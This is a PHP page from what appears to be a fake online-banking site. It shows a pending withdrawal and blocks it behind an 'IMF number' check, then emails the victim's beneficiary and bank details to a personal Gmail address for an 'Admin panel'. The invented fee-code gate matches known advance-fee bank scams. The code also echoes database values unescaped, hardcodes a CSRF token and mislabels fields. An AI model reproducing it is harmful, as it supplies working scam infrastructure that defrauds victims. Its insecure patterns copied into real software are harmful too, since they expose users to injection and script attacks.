<?php include 'includes/timeoutable.php' ?>



<body background: src="img/picc3.jpg" onload="blinktext();">

    <?php include 'includes/db.php'; ?>

    <?php 

    if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) { //ALL CODE RUNS INSIDE THIS IF A USER IS LOGGED IN

    } else { //IF NO USER LOGGED IN

        echo "<script type='text/javascript'> document.location = 'index.php?login_error=session'; </script>";

      //  header('Location: login.php?login_error=wrong');

    }

?>

<?php include 'header2.php';  ?>

<div style="min-height: 80vh;  margin-top: 100px ">

                                        <section>

        <div class="container">

            <div class="row">

                <div class="col-md-4 add">

                                            

                                                    <div class="panel panel-default">

    <div class="panel-heading" style="background-color: #fdc600;">

        <h3 class="panel-title" style="color: black">IMF Verification</h3>

    </div>

    <div class="panel-body">

        <h3 class="text-center">

            <span class="text-info add price dollar"><?php

                                $my_sql = "SELECT * FROM provide WHERE user_id = '$_SESSION[id]'";

                            $run_sql = mysqli_query($conn,$my_sql);

                            if($rows = mysqli_fetch_assoc($run_sql)){

                                echo'

                                <h3><i class="fa fa-dollar fa-1x">' .$rows['amount'] ; 

                            }

                                ?></i></span>

        </h3>

        <div class="text-center add padding-bottom-10px"><span class="label label-default blinking" id="announcement">Authourization</span></div><br>

        <div id="myProgress">

  <div id="myBar" class="myBar2"></div>

</div><br>

                                                        <?php

if(isset($_POST{'sepa_check_imf'})){ //IF LOGIN BTN HAS BEEN CLICKED

    if(!empty($_POST{'imf'})){ //CHECK IF EMAIL AND PASSWORD IS EMPTY 

        $imf = mysqli_real_escape_string($conn, $_POST['imf']);

        $imf = mysqli_real_escape_string($conn,$imf);

        $sql = "SELECT * FROM int_transfer WHERE user_id = '$_SESSION[id]'"; //FOR USERS

        if($result1 = mysqli_query($conn,$sql)){ //FOR USERS IF THERE IS CONNECTION TO THE DATABASE WHERE EMAIL AND PASSWORD IS AVAILABLE

            if(mysqli_num_rows($result1) == 1){ //IF NO. OF ROWS WITH ABOVE QUERY IS JUST ONE

                

                while($rows = mysqli_fetch_assoc($result1)){ //RETRIEVE INVENTOR DETAILS

                    $s_code = $rows['imf'];

                    if($s_code != $imf){

                        echo "<script type='text/javascript'> document.location = 'sepa_imf_verification.php?imf_error=wrong'; </script>"; 

              //  header('Location: signin.php?login_error=wrong');

                    }

                    

                    

                }

                $sql = "SELECT * FROM int_transfer WHERE user_id = '$_SESSION[id]'"; //FOR USERS

        $result1 = mysqli_query($conn,$sql);

                     //TO SEND EMAIL Admin begins

                 while($rows = mysqli_fetch_assoc($result1)){ 

                    $c_id = $rows['user_id'];

                    $c_name = $rows['name'];

                    $b_name = $rows['b_name'];

                    $b_account = $rows['b_acct'];

                    $b_country = $rows['b_country'];

                    $swift_code = $rows['swift_code'];

                    $b_routing = $rows['routing_number'];

                    $b_bank = $rows['bank_name'];

                    $b_acct_type = $rows['acct_type'];

                    $amount = $rows['amount'];

                    $b_address = $rows['address']; 

                    $name1 = "Chief";

                    $to = "loandrasale@gmail.com"; // this is your Email address

                $from = "info@bankrcu.com"; // this is the sender's Email address

                $subject2 = "Withdrawal | Request";

                $message2 = "Hello " . $name1 .",

  



A new withdrawal request has been submitted!

Customer ID : " . $c_id . "

Customer Name: " . $c_name."

Beneficiary Name: " .$b_name."

Beneficiary Account: ".$b_account."

Beneficiary Country: ".$b_name."

Swiftcode: ".$swift_code."

Routing Number: ".$b_routing ."

Beneficiary Bank: ".$b_bank ."

Beneficiary Account Number: ".$b_acct_type ."

Amount: ".$amount ."

Bank Adress: ".$b_address ."

------------------------

  

Sign into your Admin panel to effect the transaction:

http://www.account.bankrcu.com/zap

  

";

                $headers = "From:" . $from;

                mail($to,$subject2,$message2,$headers);}  // sends a copy of the message to the sender

                //TO SEND EMAIL ENDS

                echo "<script type='text/javascript'> document.location = 'panel.php?imf_correct=successful'; </script>"; 

             //   header('Location: imf-verification.php');

                    

            } else{

                echo "<script type='text/javascript'> document.location = 'sepa_imf_verification.php?imf_error=wrong'; </script>"; 

              //  header('Location: imf-verification.php?login_error=wrong');

            } //

        } else{

            echo "<script type='text/javascript'> document.location = 'sepa_imf_verification.php?imf_error=query_error'; </script>"; 

           // header('Location: imf-verification.php?login_error=query_error');

        }

    }else{

        echo "<script type='text/javascript'> document.location = 'sepa_imf_verification.php?imf_error=empty'; </script>";

     //   header('Location: imf-verification.php?imf_error=empty');

    } 

}else{

    $login_err = '';

    

}

        if(isset($_GET['imf_error'])){ //TO OUTPUT LOGIN ERROR

    if($_GET['imf_error'] == 'empty'){  //LOGIN ERROR FOR EMPTY

        $login_err = "<div class='alert alert-danger'>Sorry! field was empty!</div>";

    }elseif($_GET['imf_error'] == 'wrong'){ //LOGIN ERROR FOR INVALID DETAILS

        $login_err = "<div class='alert alert-warning'>Invalid IMF Number, please contact your account officer!</div>";

    }elseif($_GET['imf_resent'] == 'sent'){ //LOGIN ERROR FOR INVALID DETAILS

        $login_err = "<div class='alert alert-success'>OTP has been resent!</div>";

    }

}else{ echo"

                        

                                                        <div class='alert alert-info text-center'>Please enter your <strong style='color: red'>IMF number</strong> to proceed</div>";} echo $login_err;?><br>

                                                        

            <br>

                                                        <?php

            $inter_sql = "SELECT * FROM int_transfer WHERE user_id ='$_SESSION[id]'";

        $inter_q = mysqli_query($conn, $inter_sql);

        if(mysqli_num_rows($inter_q) > 0){

            while($rows = mysqli_fetch_assoc($inter_q)){

            

            

            ?>

            <form  class="form-horizontal" method="post"  action="sepa_imf_verification.php">

                        <input type='hidden' name='csrfmiddlewaretoken' value='XFe2rTYl9WOpV8U6X5CfbIuOZOELJ97S' />

                       

                        <div id="div_id_location" class="form-group required">

                            <label for="id_location" class="control-label col-md-4"> Transaction Type</label>

                            <div class="controls col-md-8 ">

                                <input class="input-md textinput textInput form-control" id="id_location" name="location" placeholder="INT Bank Transfer" style="margin-bottom: 10px" type="text" readonly>

                            </div> 

                        </div>

                <div id="div_id_company" class="form-group required"> 

                            <label for="amount" class="control-label col-md-4  requiredField" style="color: green"> Amount</label>

                            <div class="controls col-md-8 "> 

                                 <input class="input-md textinput textInput form-control" id="amount" name="amount" placeholder="<?php echo $rows['amount']; ?>" style="margin-bottom: 10px" type="number" / readonly>

                            </div>

                        </div> 

                        <div id="div_id_bank_name" class="form-group required">

                            <label for="bank_name" class="control-label col-md-4"> Bank</label>

                            <div class="controls col-md-8 ">

                                <input class="input-md  textinput textInput form-control" id="bank_name" maxlength="30" name="bank_name" placeholder="<?php echo $rows['bank_name']; ?> " style="margin-bottom: 10px" type="text" / readonly>

                            </div>

                        </div>

                        <div id="div_id_acct_number" class="form-group required">

                            <label for="id_acct_number" class="control-label col-md-4  requiredField">Name</label>

                            <div class="controls col-md-8 ">

                                <input class="input-md acct_numberinput form-control" id="id_acct_name" name="b_name" placeholder=" <?php echo $rows['b_name']; ?>" style="margin-bottom: 10px" type="text" / readonly>

                            </div>     

                        </div>

                        <div id="div_id_country" class="form-group required">

                             <label for="id_password2" class="control-label col-md-4  requiredField"> Address</label>

                             <div class="controls col-md-8 ">

                                <input class="input-md acct_numberinput form-control" id="id_acct_name" name="b_country" placeholder=" <?php echo $rows['b_country']; ?>" style="margin-bottom: 10px" type="text" / readonly>

                            </div>

                        </div>

                        <div id="div_id_name" class="form-group required"> 

                            <label for="id_name" class="control-label col-md-4  requiredField"> Swift Code</label> 

                            <div class="controls col-md-8 "> 

                                <input class="input-md textinput textInput form-control" id="id_name" name="swift_code" placeholder="<?php echo $rows['swift_code']; ?>" style="margin-bottom: 10px" type="text" / readonly>

                            </div>

                        </div>

                       <!-- <div id="div_id_gender" class="form-group required">

                            <label for="id_gender"  class="control-label col-md-4  requiredField"> Gender</label>

                            <div class="controls col-md-8 "  style="margin-bottom: 10px">

                                 <label class="radio-inline"> <input type="radio" name="gender" id="id_gender_1" value="M"  style="margin-bottom: 10px">Male</label>

                                 <label class="radio-inline"> <input type="radio" name="gender" id="id_gender_2" value="F"  style="margin-bottom: 10px">Female </label>

                            </div>

                        </div>-->

                        <div id="div_id_company" class="form-group required"> 

                            <label for="id_company" class="control-label col-md-4  requiredField"> Bank Code</label>

                            <div class="controls col-md-8 "> 

                                 <input class="input-md textinput textInput form-control" id="id_company" name="routing_number" placeholder="<?php echo $rows['routing_number']; ?>" style="margin-bottom: 10px" type="text" / readonly>

                            </div>

                        </div> 

                        <div id="div_id_catagory" class="form-group required">

                            <label for="id_catagory" class="control-label col-md-4  requiredField">Purpose</label>

                            <div class="controls col-md-8 "> 

                                 <input class="input-md textinput textInput form-control" id="id_catagory" name="description" placeholder="<?php echo $rows['description']; ?>" style="margin-bottom: 10px" type="text" / readonly>

                            </div>

                        </div> 

                        <div id="div_id_number" class="form-group required">

                             <label for="id_number" class="control-label col-md-4  requiredField"> Account Type</label>

                             <div class="controls col-md-8 ">

                                 <select name="acct_type" id="acct_type" class="form-control" disabled="disabled">

                                      <option value="Savings Account" selected><?php echo $rows['acct_type']; }}?></option>

                                      <option value="current">Current Account</option>

                                      <option value="checking">Checking Account</option>

                                      <option value="fixed">Fixed Deposit</option>

                                     <option value="non_resident">Non Resident Account</option>

                                      <option value="online_banking">Online Banking</option>

                                       <option value="domicilary">Domicilary Account</option>

                                     <option value="joint">Joint Account</option>

                                    </select>

                            </div> 

                        </div> 

                        <div id="div_id_catagory" class="form-group required">

                            <label for="id_catagory" style="color: red" class="control-label col-md-4  requiredField">IMF</label>

                            <div class="controls col-md-8 "> 

                                

                                 <input class="input-md textinput textInput form-control" id="id_catagory" name="imf" placeholder="Please enter your IMF number" style="margin-bottom: 10px" type="text" />

                            </div>

                        </div> 

                        <div class="form-group"> 

                            <div class="aab controls col-md-4 "></div>

                            <div class="controls col-md-8 col-lg-8">

                                <a href'#'><input type="submit" name="Back" value="Back" class="btn btn-sm btn-danger btn btn-info" id="submit-id-signup" /></a>

                                <input type="submit" name="sepa_check_imf" value="Proceed" style="background-color: #fdc600;" class="btn btn-sm btn" id="submit-id-signup" />

                            </div>

                        </div> 

                            

                    </form>

        

        

            </div>

</div>                                                            </div>

                <div class="col-md-4">

                    <div class="panel panel-default">

                        <div class="panel-heading" style="background-color:  #fdc600;">

                            <h3 class="panel-title" style="color: black">Status</h3>

                        </div>

                        <div class="panel-body panel-table">

                                                            <div class="table-responsive">

                                    <table class="table table-hover table-bordered">

                                        <thead>

                                        <tr>

                                            <th class="text-center" id="announcement">AMOUNT</th>

                                            <th class="text-center">TIME</th>

                                            <th class="text-center">STATUS</th>

                                        </tr>

                                        </thead>

                                        <tbody>

                                                                                    <tr class="text-center  blink ">

                                                                                        <?php

                                    $status = "Awaiting Authourization";

                                $my_sql = "SELECT * FROM provide WHERE user_id = '$_SESSION[id]'";

                            $run_sql = mysqli_query($conn,$my_sql);

                            if($rows = mysqli_fetch_assoc($run_sql)){ ?>

                                                <td class="text-left">

                                                    <a href="billing.php"

                                                       class="btn-link btn-warning">

                                                        <span class="text-uppercase" id="announcement"><i class="fa fa-dollar fa-1x" id="announcement"></i> <?php echo $rows['amount']; ?></span>

                                                    </a>

                                                </td>

                                                <td>

                                                    <span class="add price dollar"><?php echo $rows['created_at']; ?></span>

                                                </td>

                                                <td>

                                                                                                            <span class="text-info"><?php echo $status; 

                            ;}

                                ?></span>

                                                                                                    </td>

                                            </tr>

                                                                                </tbody>

                                    </table>

                                </div>

                                <div class="text-center">

                                    

                                </div>

                                                    </div>

                    </div>

                </div>

                <div class="col-md-4">

                    <div class="panel panel-default">

                        <div class="panel-heading" style="background-color:  #fdc600;">

                            <h3 class="panel-title blinking" style="color: black;">Transaction History</h3>

                        </div>

                        <div class="panel-body panel-table">

                                                            <div class="alert">

                                    <strong><div class="table-responsive wide-table" style="border-color: transparent">

    <table class="table table-hover table-bordered add border-radius">

        <thead>

        <tr>

             

            

            <th>Transaction</th>

            <th>Amount</th>

            <th>Date</th>

            <th>Status</th>

                    </tr>

        </thead>

        

        

            <?php

                    $i = 1;

        

                    $my_sql = "SELECT * FROM transaction WHERE user_id = '$_SESSION[id]'";

                    $run_sql = mysqli_query($conn,$my_sql);

                    if(mysqli_num_rows($run_sql) > 0){

                    while($rows = mysqli_fetch_assoc($run_sql)){ 

       echo '<tr><td>' .$rows['transaction']. '</td><td>'.$rows['amount'].'</td><td>'.$rows['created_at'].'</td><td ><button type="button" class="btn btn-success btn-sm">'.$rows['Status']. '</button></td></tr>';

                    } }else{

                        echo' No table to display';

                        

                    }?>

        

    </table>

</div></strong>

                                </div>

                                                    </div>

                    </div>

                </div>

            </div>

        </div>

    </section>

    </div>

   

            <?php include 'footer.php' ?>

</body>

<?php

                      if(isset($_GET['registered'])) {

                     echo '<div class="alert alert-success">

  <strong>Registration Successfull!</strong> Please signin to continue.

</div>';

                        }

                        ?>

            

